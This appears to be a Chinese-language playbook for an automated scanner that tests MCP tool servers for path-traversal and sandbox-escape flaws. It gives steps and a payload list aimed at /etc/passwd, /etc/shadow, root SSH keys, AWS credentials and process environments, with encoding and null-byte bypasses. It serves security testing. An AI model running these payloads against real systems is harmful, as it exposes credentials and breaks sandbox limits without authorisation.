# path_traversal

## When to use
Tool 名或描述含 `file` / `read` / `config` / `download` / `open`;参数名含 `path` / `filename` / `filepath` / `document`。也适用于 resource URI 支持路径参数的场景。

## Objective
让目标读取一个**位于文件系统根路径或系统敏感位置**的文件,内容通过响应回流。判定依据是 signals 中的 `leaks_etc_passwd` / `leaks_shadow_hash` / `leaks_ssh_private_key` 命中;或目标声明沙箱根时,在根外写入/读回文件,命中 `sandbox_escape_write` / `sandbox_escape_read`。

## Playbook
1. `list_tools`,挑一个疑似读文件的 tool 并读它的输入 schema。
2. 先用一个「显然合法」的路径 (`/tmp/hello.txt`, `./README.md`) 试探是否真读了本地文件。
3. 若成功,依次尝试:绝对路径 → `../` 相对路径逃逸 → URL 编码变体 (`%2e%2e%2f`)。
4. 目标文件优先级:`/etc/passwd`, `/etc/shadow`, `/root/.ssh/id_rsa`, `~/.aws/credentials`, `/proc/1/environ`。
5. 若 tool 声明有前缀白名单, 用 `..` 越界或 `//`, `\\`, `%00` 绕过。
6. 若工具/部署声明沙箱根 (如 `EXCEL_FILES_PATH`, 或 scan 传了 `--sandbox-root`), 直接在**根外**建 marker 文件再读回: 绝对路径 (`/root/mcpwn_marker.xlsx`) 或 `../` 逃逸; 写成功即 `sandbox_escape_write` (high), 读回内容即 `sandbox_escape_read` (high), 两条都是独立判定依据。

## Templates
- `../../../../etc/passwd`
- `/etc/passwd`
- `..\\..\\..\\etc\\shadow`
- `%2e%2e%2f%2e%2e%2fetc%2fpasswd`
- `/root/.ssh/id_rsa`
- `/root/mcpwn_marker.xlsx` (沙箱根外写入+读回)
- `../../mcpwn_marker.xlsx`
- `..\..\mcpwn_marker.xlsx`
